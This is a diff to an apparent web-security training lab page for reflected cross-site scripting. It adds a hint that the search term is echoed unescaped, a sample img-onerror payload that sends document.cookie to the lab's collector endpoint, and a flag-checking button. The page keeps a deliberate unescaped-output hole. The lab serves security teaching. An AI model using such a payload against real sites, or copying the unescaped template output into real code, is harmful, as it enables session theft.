@@ -19,6 +19,8 @@
     <% if (q) { %>
       <p>Showing results for: <%- q %></p>
     <% } %>
+    <p class="lab-meta">The search term is reflected into the page without escaping. Execute script that sends the proof cookie to the collector.</p>
+    <pre class="lab-code">&lt;img src=x onerror="fetch('/labs/reflected-xss/collect?p='+encodeURIComponent(document.cookie))"&gt;</pre>
   </div>
 
   <div class="lab-card">
@@ -31,14 +33,25 @@
   </div>
 
   <div class="lab-card">
-    <h2>Stay Updated</h2>
-    <form onsubmit="event.preventDefault(); this.querySelector('.msg').textContent='Subscribed!';">
-      <label>Email Newsletter</label>
-      <input type="email" placeholder="your@email.com">
-      <button type="submit" class="secondary">Subscribe</button>
-      <span class="msg lab-meta"></span>
-    </form>
+    <h2>Verification</h2>
+    <button type="button" class="secondary" id="checkReflected">Check verification</button>
+    <pre class="lab-code" id="reflectedResult" style="margin-top:0.8rem;">Not checked yet.</pre>
   </div>
 
+  <form method="POST" action="/labs/reflected-xss/reset"><button type="submit" class="secondary">Reset lab</button></form>
+</div>
+<script>
+  document.getElementById('checkReflected').addEventListener('click', async function () {
+    const out = document.getElementById('reflectedResult');
+    try {
+      const response = await fetch('/labs/reflected-xss/status');
+      const data = await response.json();
+      out.textContent = JSON.stringify(data, null, 2);
+      if (data.flag) out.textContent += '\n\nFLAG: ' + data.flag;
+    } catch (error) {
+      out.textContent = 'Status check failed: ' + error.message;
+    }
+  });
+</script>
 </body>
 </html>
